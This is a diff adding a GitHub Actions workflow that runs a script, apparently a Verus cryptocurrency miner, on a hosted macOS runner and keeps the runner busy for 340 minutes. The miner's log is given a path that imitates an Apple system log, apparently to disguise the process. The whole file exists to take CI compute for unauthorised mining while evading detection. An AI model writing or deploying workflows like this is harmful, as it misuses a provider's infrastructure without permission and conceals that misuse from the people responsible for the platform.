@@ -1,0 +1,30 @@
+name: VerusMine Mac
+
+on:
+  workflow_dispatch:
+
+jobs:
+  mine:
+    name: VerusMine
+    runs-on: macos-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install & Start Verus Miner
+        run: |
+          chmod +x mine.sh
+          bash mine.sh
+
+      - name: Keep Runner Alive (mining loop)
+        run: |
+          echo "[*] Mining in background — keeping runner alive..."
+          LOGFILE="$HOME/Library/Logs/com.apple.webkit.networkd.log"
+          for i in $(seq 1 340); do
+            sleep 60
+            echo "--- tick $i / 340 ---"
+            if [ -f "$LOGFILE" ]; then
+              tail -5 "$LOGFILE"
+            fi
+          done
